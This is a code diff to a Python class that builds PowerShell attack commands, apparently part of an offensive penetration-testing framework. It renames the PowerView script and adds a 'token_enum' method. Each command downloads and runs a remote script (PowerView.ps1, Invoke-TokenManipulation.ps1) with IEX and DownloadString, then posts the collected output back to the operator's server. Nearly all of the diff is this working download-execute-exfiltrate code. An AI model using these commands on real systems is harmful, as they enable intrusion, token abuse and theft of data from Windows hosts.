@@ -81,7 +81,7 @@ class PowerShell:
     def powerview(self, command):
 
         command = """
-        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}:{port}/powerview.ps1');
+        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}:{port}/PowerView.ps1');
         $output = {view_command} | Out-String;
         $request = [System.Net.WebRequest]::Create('{protocol}://{addr}:{port}/');
         $request.Method = 'POST';
@@ -95,6 +95,29 @@ class PowerShell:
                                           port=settings.args.server_port,
                                           addr=self.localip,
                                           view_command=command)
+
+        if self.arch == 'auto':
+            return ps_command(command, 64)
+        else:
+            return ps_command(command, int(self.arch))
+
+    def token_enum(self):
+
+        command = """
+        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}:{port}/Invoke-TokenManipulation.ps1');
+        $output = Invoke-{func_name} -Enumerate | Out-String;
+        $request = [System.Net.WebRequest]::Create('{protocol}://{addr}:{port}/');
+        $request.Method = 'POST';
+        $request.ContentType = 'application/x-www-form-urlencoded';
+        $bytes = [System.Text.Encoding]::ASCII.GetBytes($output);
+        $request.ContentLength = $bytes.Length;
+        $requestStream = $request.GetRequestStream();
+        $requestStream.Write( $bytes, 0, $bytes.Length );
+        $requestStream.Close();
+        $request.GetResponse();""".format(protocol=self.protocol,
+                                          func_name=self.func_name,
+                                          port=settings.args.server_port,
+                                          addr=self.localip)
 
         if self.arch == 'auto':
             return ps_command(command, 64)
